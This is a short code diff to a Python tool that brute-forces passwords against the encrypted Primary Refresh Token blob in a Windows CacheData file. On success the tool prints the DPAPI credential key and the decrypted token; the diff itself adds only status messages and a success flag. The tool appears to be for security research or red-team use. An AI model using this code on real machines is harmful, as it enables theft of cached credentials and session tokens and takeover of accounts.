@@ -20,8 +20,9 @@ def bruteforce(arguments):
             break
     if cache_data_node_password is None:
         raise Exception('No node of type password (0x1) found in CacheData file')
-
+    print('[+] CacheData node of type password (0x1) has been found')
     enc_data = cache_data_node_password.encryptedPRTBlob
+    success = False
     for password in arguments.passwords:
         if arguments.verbose:
             print("Trying: " + password + "\n")
@@ -37,6 +38,7 @@ def bruteforce(arguments):
             if not decrypted_prt.startswith(b'{"Version"'):
                 continue
             print(f"[+] Password: '{password}'")
+            success = True
             dpapi_cred_key_blob = decrypted_blob[0x10:0x10+raw_dpapi_cred_key_size]
             dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
             print(f'[+] Dumping raw DPAPI Cred key, with GUID {dpapi_cred_key_blob_obj.Guid} (0x40 bytes):')
@@ -49,6 +51,8 @@ def bruteforce(arguments):
             prt_dict = json.loads(decrypted_prt)
             print(json.dumps(prt_dict, indent=4))
             break
+    if not success:
+        print('[+] End of bruteforce, no valid password found.')
 
 
 def get_pbkdf2(password, salt=b'', iterations=10000):
